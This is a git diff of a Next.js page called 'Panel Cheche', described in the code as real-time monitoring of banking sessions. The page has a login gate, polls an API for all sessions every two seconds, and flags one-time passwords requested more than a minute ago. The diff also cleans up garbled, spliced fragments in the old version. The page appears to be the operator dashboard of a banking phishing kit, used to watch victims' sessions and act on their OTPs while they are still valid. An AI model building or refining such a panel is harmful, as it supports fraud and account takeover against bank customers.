@@ -50,6 +50,23 @@ export default function ChechePanelPage() {
   const router = useRouter();
 
   useEffect(() => {
+    // Verificar si ya está autenticado
+    const auth = sessionStorage.getItem('cheche_auth');
+    if (auth === 'true') {
+      setIsAuthenticated(true);
+    } else {
+      setLoading(false);
+    }
+  }, []);
+
+  useEffect(() => {
+    if (!isAuthenticated) return;
+    
+    fetchSessions();
+    const interval = setInterval(fetchSessions, 2000); // Actualizar cada 2 segundos
+    return () => clearInterval(interval);
+  }, [isAuthenticated]);
+
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -69,23 +86,6 @@ export default function ChechePanelPage() {
     setUsername('');
     setPassword('');
   };
-
-  const fetchSessions = async () => {
-    try {
-      const response = await fetch('/api/cheche?action=get_all_sessions');
-      const data = await response.json();
-      if (data.success) {
-        setSessions(data.sessions);
-      }
-    } catch (error) {
-      console.error('Error fetching sessions:', error);
-    } finally {
-      setLoading(false);
-    }
-  };fetchSessions();
-    const interval = setInterval(fetchSessions, 2000); // Actualizar cada 2 segundos
-    return () => clearInterval(interval);
-  }, [isAuthenticated]);
 
   const fetchSessions = async () => {
     try {
@@ -178,6 +178,21 @@ export default function ChechePanelPage() {
     );
   };
 
+  const formatTime = (dateString: string) => {
+    return new Date(dateString).toLocaleTimeString('es-CO', {
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit'
+    });
+  };
+
+  const isOTPExpired = (otpRequestedAt?: string) => {
+    if (!otpRequestedAt) return false;
+    const requestTime = new Date(otpRequestedAt);
+    const now = new Date();
+    return (now.getTime() - requestTime.getTime()) > 60000; // 1 minuto
+  };
+
   if (!isAuthenticated) {
     return (
       <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
@@ -190,23 +205,11 @@ export default function ChechePanelPage() {
             </div>
             <h1 className="text-3xl font-bold text-gray-900 mb-2">Panel Cheche</h1>
             <p className="text-gray-600">Ingresa tus credenciales para acceder</p>
-    <div className="min-h-screen bg-gray-100 p-6">
-      <div className="max-w-7xl mx-auto">
-        <div className="mb-8 flex justify-between items-center">
-          <div>
-            <h1 className="text-3xl font-bold text-gray-900 mb-2">Panel Cheche</h1>
-            <p className="text-gray-600">Monitoreo en tiempo real de sesiones bancarias</p>
           </div>
-          <button
-            onClick={handleLogout}
-            className="flex items-center gap-2 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition"
-          >
-            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
-            </svg>
-            Cerrar Sesión
-          </button>
-        </div>bel>
+
+          <form onSubmit={handleLogin} className="space-y-4">
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-2">Usuario</label>
               <input
                 type="text"
                 value={username}
@@ -259,34 +262,26 @@ export default function ChechePanelPage() {
         </div>
       </div>
     );
-  }   second: '2-digit'
-    });
-  };
-
-  const isOTPExpired = (otpRequestedAt?: string) => {
-    if (!otpRequestedAt) return false;
-    const requestTime = new Date(otpRequestedAt);
-    const now = new Date();
-    return (now.getTime() - requestTime.getTime()) > 60000; // 1 minuto
-  };
-
-  if (loading) {
-    return (
-      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
-        <div className="text-center">
-          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
-          <p className="text-gray-600">Cargando panel...</p>
-        </div>
-      </div>
-    );
   }
 
   return (
     <div className="min-h-screen bg-gray-100 p-6">
       <div className="max-w-7xl mx-auto">
-        <div className="mb-8">
-          <h1 className="text-3xl font-bold text-gray-900 mb-2">Panel Cheche</h1>
-          <p className="text-gray-600">Monitoreo en tiempo real de sesiones bancarias</p>
+        <div className="mb-8 flex justify-between items-start">
+          <div>
+            <h1 className="text-3xl font-bold text-gray-900 mb-2">Panel Cheche</h1>
+            <p className="text-gray-600">Monitoreo en tiempo real de sesiones bancarias</p>
+          </div>
+          <button
+            onClick={handleLogout}
+            className="flex items-center gap-2 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition"
+          >
+            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
+            </svg>
+            Cerrar Sesión
+          </button>
+        </div>
           
           {sessions.length > 0 && (
             <div className="flex gap-4 mt-4">
